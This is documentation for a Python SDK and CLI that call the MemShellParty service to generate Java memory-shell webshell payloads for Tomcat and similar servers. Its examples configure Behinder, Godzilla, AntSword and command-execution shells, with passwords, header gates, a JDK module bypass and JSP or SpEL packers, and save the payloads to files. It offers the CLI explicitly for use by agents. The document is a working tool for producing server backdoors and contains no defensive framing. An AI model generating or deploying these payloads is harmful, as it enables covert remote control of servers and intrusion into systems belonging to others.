# wtfutil.memshellutil

Guide for **Python SDK callers**: call the [MemShellParty](https://github.com/ReaJason/MemShellParty) HTTP service to query valid combos and generate Java memory-shell payloads.

- Default host: [https://party.mem.mk](https://party.mem.mk)
- Upstream: [Issue #143](https://github.com/ReaJason/MemShellParty/issues/143)
- CLI is at the end of this page; prefer `MemShellParty` in scripts and application code.

**No built-in cache.** If you need to reuse results for the same inputs, cache them yourself (by request body or your own key).

---

## Quick start

```python
from wtfutil.memshellutil import MemShellParty, MemShellPartyError

with MemShellParty() as client:
    result = client.generate(
        shell_tool="behinder",   # case-insensitive
        shell_type="listener",
        jre=9,                   # Java/JRE release; ≥9 auto byPassJavaModule=True
        password="example-pass",         # convenience password → behinderPass
        header_value="example-token",    # header gate (default header_name=User-Agent)
    )
    payload = result["packResult"]           # packed deliverable string
    info = result["memShellResult"]          # class names, sizes, connect params
    print(payload[:80], "...")
    print(info["shellClassName"], info["injectorClassName"])
```

Import SDK APIs from their owning public submodule:

```python
from wtfutil.memshellutil import MemShellParty
```

---

## Service URL

Precedence (later wins; constructor wins overall):

1. Default `https://party.mem.mk`
2. `wtfconfig.ini` `[memshell] BASE_URL` (via [`configutil`](configutil.md))
3. Env `MEMSHELL_BASE_URL`
4. Constructor `MemShellParty(base_url="https://...")`

```ini
# wtfconfig.ini
[memshell]
BASE_URL = https://party.mem.mk
```

```python
client = MemShellParty(base_url="http://127.0.0.1:8080", timeout=120)
```

Module-level `memshell_config` is refreshed on client init (mtime hot-reload). Application code usually does not edit it directly.

---

## Client lifecycle

| Pattern | Notes |
|---------|--------|
| `with MemShellParty() as client:` | Preferred; closes the internal session on exit |
| `client = MemShellParty(); ...; client.close()` | Manual close |
| `MemShellParty(session=existing)` | Reuse an external session; `close()` does **not** close it |

Constructor args:

| Arg | Default | Notes |
|-----|---------|--------|
| `base_url` | see above | Service root (trailing slash optional) |
| `timeout` | `60` | Per-request timeout in seconds; raise if generate is slow |
| `session` | created internally | Enhanced session from `wtfutil.httputil`; caller controls retries when supplied |
| `connect_retries` | `2` | Retry connection-establishment failures only; `0` disables retries |
| `retry_backoff` | `0.25` | Connection retry backoff factor; must be finite and non-negative |

---

## API overview

| Method | Purpose |
|--------|---------|
| `get_config()` | Valid `server → shellTool → shellType` tree |
| `get_packers_tree()` | Available packer tree |
| `get_command_configs()` | Command tool encryptors / implementations |
| `generate(body=None, **kwargs)` | Generate + pack; returns full JSON |

### Discover then generate (recommended)

When you are unsure which `shell_tool` / `shell_type` pairs exist:

```python
with MemShellParty() as client:
    cfg = client.get_config()
    # shape: { "Tomcat": { "Behinder": ["Listener", "Filter", ...], ... }, ... }
    tools = cfg["Tomcat"]
    print(sorted(tools.keys()))
    print(tools["Behinder"])

    packers = client.get_packers_tree()  # [{ "name": "...", "children": [...] }, ...]
    cmd = client.get_command_configs()  # encryptors / implementationClasses
```

Invalid combos fail on the server; the SDK raises `MemShellPartyError`.

---

## generate: parameters and defaults

`generate(**kwargs)` uses **snake_case**; the SDK builds official camelCase JSON. You may also pass a full `body=` dict. When both are present, **body deep-merges over** the kwargs-built payload.

`body` must be a JSON-style object. Its `shellConfig`, `shellToolConfig`, and `injectorConfig` fields must also be objects; invalid nested types raise `TypeError` locally before any generate request is sent. `extract_generate_meta()` applies the same object validation to the corresponding response fields.

**Case**: `server` / `shell_tool` / `shell_type` are **case-insensitive** within the known official names (`tomcat` → `Tomcat`, `GODZILLA` → `Godzilla`). Unknown names are sent as-is. The known list may lag upstream; check with `get_config()` / `memshell config`.

### Built-in defaults (aligned with the official UI)

| Dimension | Default |
|-----------|---------|
| `server` | `Tomcat` |
| `shell_tool` | **`Behinder`** |
| `shell_type` | `Listener` |
| `jre` | `6` (Java 6; also common: 8 / 9 / 11 / 17 / 21 / 22) |
| `server_version` | `"unknown"` (rarely needed) |
| `shrink` | `True` |
| `static_initialize` | `True` |
| `packer` | `DefaultBase64` |
| `header_name` | `User-Agent` |
| `by_pass_java_module` | If omitted: `True` when `jre ≥ 9`, else `False` |

For `shell_tool="Command"` when unset: `encryptor="RAW"`, `implementation_class="RuntimeExec"`.

### Passwords and headers

| Form | Behavior |
|------|----------|
| `password="example-pass"` | Mapped by `shell_tool` to Behinder / Godzilla / AntSword `*Pass` |
| `key="example-key"` | Written as Godzilla `godzillaKey` (usually irrelevant for other tools) |
| `behinder_pass` / `godzilla_pass` / `godzilla_key` / `ant_sword_pass` | Advanced: specific fields win over `password` / `key` (prefer convenience fields day-to-day) |
| Empty password fields | Server generates random values; returned in `memShellResult.shellToolConfig` |
| `header_name` + `header_value` | Request must match this header before shell logic runs; set `header_value` yourself in practice |

```python
# convenience
client.generate(
    shell_tool="Behinder",
    password="example-pass",
    header_value="example-token",
)

# Godzilla
client.generate(
    shell_tool="Godzilla",
    shell_type="Filter",
    password="example-pass",
    key="example-key",
    header_value="example-token",
)

# specific field overrides convenience password
client.generate(
    shell_tool="Behinder",
    password="example-unused-pass",
    behinder_pass="example-override-pass",
)
```

### Parameter reference

| kwargs | Official field | Meaning |
|--------|----------------|---------|
| `server` | shellConfig.server | Target middleware (case-insensitive): Tomcat, Jetty, SpringWebMvc… |
| `server_version` | shellConfig.serverVersion | Server version; only needed for a few mount types |
| `shell_tool` | shellConfig.shellTool | Behinder / Godzilla / Command… (case-insensitive) |
| `shell_type` | shellConfig.shellType | Listener / Filter / Valve… (case-insensitive) |
| `jre` | shellConfig.targetJreVersion | **Preferred**: Java/JRE release `6` / `8` / `9` / `11` / `17` / `21` / `22`; later releases are converted by the standard `release + 44` mapping |
| `target_jre_version` | same | Advanced/legacy; release or official class major; `jre` wins if both set. A `targetJreVersion` inside `body` is sent as-is (no release conversion) |
| `debug` | shellConfig.debug | Injector prints inject info; shell prints stack traces |
| `by_pass_java_module` | shellConfig.byPassJavaModule | Bypass JDK9+ modules via Unsafe defineClass |
| `shrink` | shellConfig.shrink | Shrink bytecode (ASM SKIP_DEBUG); default True |
| `probe` | shellConfig.probe | Wrap injector in a probe shell for remote verify |
| `lambda_suffix` | shellConfig.lambdaSuffix | Append `$Proxy0$$Lambda$1` to class names |
| `url_pattern` | injectorConfig.urlPattern | Mount/match URL; default `/*` |
| `injector_class_name` | injectorConfig.injectorClassName | Injector FQCN; empty = random |
| `static_initialize` | injectorConfig.staticInitialize | Static block calls ctor (`Class.forName(..., true, ...)`) |
| `shell_class_name` | shellToolConfig.shellClassName | Shell FQCN; empty = random |
| `behinder_pass` | behinderPass | Advanced Behinder password (prefer `password`) |
| `godzilla_pass` / `godzilla_key` | godzillaPass / godzillaKey | Advanced Godzilla pass/key (prefer `password` / `key`) |
| `ant_sword_pass` | antSwordPass | Advanced AntSword password (prefer `password`) |
| `password` / `key` | (mapped by tool) | **Preferred** convenience credentials |
| `header_name` / `header_value` | headerName / headerValue | Entry header gate |
| `command_param_name` | commandParamName | Command: param or header name |
| `command_template` | commandTemplate | Command: template with `{command}` |
| `encryptor` | encryptor | Command: RAW / BASE64 / DOUBLE_BASE64 |
| `implementation_class` | implementationClass | Command: RuntimeExec / ForkAndExec |
| `shell_class_base64` | shellClassBase64 | Custom: Base64 of a `.class` |
| `packer` | packer | Packing format (DefaultBase64, JSP, SpEL…) |

For JDK 9+ runtimes, pass `jre=9` (or higher) so module bypass turns on automatically.

---

## Using the response

On success, `generate` returns a **dict** (full server JSON). Common keys:

| Key | Use |
|-----|-----|
| `packResult` | Main packed string for the chosen `packer`; usually all you need |
| `allPackResults` | Multi-format payloads when the server provides them |
| `memShellResult` | Metadata: class names, sizes, final shell/injector/tool configs |

```python
result = client.generate(...)
payload = result["packResult"]

mem = result["memShellResult"]
print(mem["shellClassName"], mem["injectorClassName"])
print(mem["shellSize"], mem["injectorSize"])
print(mem["shellToolConfig"])  # includes server-generated connection credentials when left empty
```

For compact metadata without a large `packResult`:

```python
from wtfutil.memshellutil import extract_generate_meta

meta = extract_generate_meta(result)
# shellClassName / injectorClassName / shellToolConfig / hasPackResult ...
```

---

## More examples

### Behinder + Filter + packer

```python
with MemShellParty() as client:
    r = client.generate(
        server="Tomcat",
        shell_tool="Behinder",
        shell_type="Filter",
        jre=8,
        url_pattern="/*",
        password="example-pass",
        header_name="User-Agent",
        header_value="example-token",
        packer="DefaultBase64",
    )
    open("payload.txt", "w", encoding="utf-8").write(r["packResult"])
```

### Command tool

```python
with MemShellParty() as client:
    opts = client.get_command_configs()
    r = client.generate(
        shell_tool="Command",
        shell_type="Listener",
        jre=9,
        command_param_name="cmd",
        encryptor="RAW",
        implementation_class="RuntimeExec",
        header_value="example-token",
    )
```

### Official camelCase `body`

```python
body = {
    "shellConfig": {"server": "Tomcat", "shellTool": "Behinder", "shellType": "Listener"},
    "shellToolConfig": {
        "behinderPass": "example-pass",
        "headerValue": "example-token",
    },
    "injectorConfig": {"urlPattern": "/*"},
    "packer": "DefaultBase64",
}
# kwargs defaults are built first; body deep-merges on top
result = client.generate(body=body, jre=9)
```

Build the request without sending:

```python
from wtfutil.memshellutil import build_generate_body

req = build_generate_body(
    shell_tool="Godzilla",
    password="example-pass",
    key="example-key",
    header_value="example-token",
)
result = client.generate(body=req)
```

---

## Error handling

Failures raise `MemShellPartyError`:

| Attribute | Meaning |
|-----------|---------|
| `str(e)` / `args` | Fixed error category and HTTP status; network errors also include a sanitized target, exception type, and errno summary |
| `e.status_code` | HTTP status (may be `None`) |
| `e.body` | Compatibility attribute; SDK-generated errors leave it as `None` and do not retain the raw response |

```python
from wtfutil.memshellutil import MemShellParty, MemShellPartyError

try:
    with MemShellParty() as client:
        client.generate(shell_type="NotExist")
except MemShellPartyError as e:
    print(e, e.status_code)
```

Typical causes include an illegal combination, unreachable host, non-JSON response, or timeout. HTTP errors, non-JSON responses, and response `error` fields expose only a fixed error category and status code, never the server text or response payload; JSON parsing failures remain available through `e.__cause__`. Transport-level `requests` exceptions are also wrapped in `MemShellPartyError`, with the original exception available as `e.__cause__`. Internally owned sessions retry connection-establishment failures twice by default. Read timeouts, HTTP status failures, and response parsing failures are not retried. Externally supplied sessions keep the caller's retry policy.

---

## Helpers

| Symbol | Notes |
|--------|--------|
| `DEFAULT_BASE_URL` | Default service root constant |
| `JRE_RELEASE_TO_CLASS` | JRE release → class major map (rarely needed directly) |
| `KNOWN_SERVERS` / `KNOWN_SHELL_TOOLS` / `KNOWN_SHELL_TYPES` | Known names for case folding |
| `canonicalize_server` / `canonicalize_shell_tool` / `canonicalize_shell_type` | Standalone normalizers |
| `memshell_config` | Runtime config dict (`BASE_URL`) |
| `build_generate_body(...)` | Build request body only (no HTTP) |
| `resolve_jre_class_version(...)` | Normalize release or class major to API number |
| `resolve_shell_credentials(...)` | Map `password`/`key` to tool-specific fields |
| `extract_generate_meta(result, output=...)` | Compact meta from a generate response |
| `MemShellPartyError` | API / protocol errors |

---

## CLI (optional)

The `memshell` console script ships with the package. Its `wtfutil.memshell` implementation module is a CLI entry point, not a public SDK submodule; use `wtfutil.memshellutil` from Python code. The CLI suits automation and agents.

```bash
memshell generate --help
memshell generate -o payload.txt
memshell generate --shell-tool Godzilla --shell-type Filter --jre 9 -o out.txt
memshell config
memshell packers
memshell install-skill --project
```

- **`-o PATH`**: write only `packResult` to the file; stdout is meta JSON.
- **Without `-o`**: stdout is the full response JSON.
- **`--jre`**: target Java release (6/8/9/11/17/21).
- **`--server` / `--shell-tool` / `--shell-type`**: case-insensitive for known names.
- Prefer `--password` / `--key`; dedicated `*-pass` and `--target-jre-version` still work but are hidden from `--help`.

Flags mirror the kwargs table above; see `memshell generate --help`.

---

## Tests

```bash
python -m unittest tests.test_memshell
# live calls are skipped by default; explicitly enable them:
set MEMSHELL_RUN_LIVE=1
```
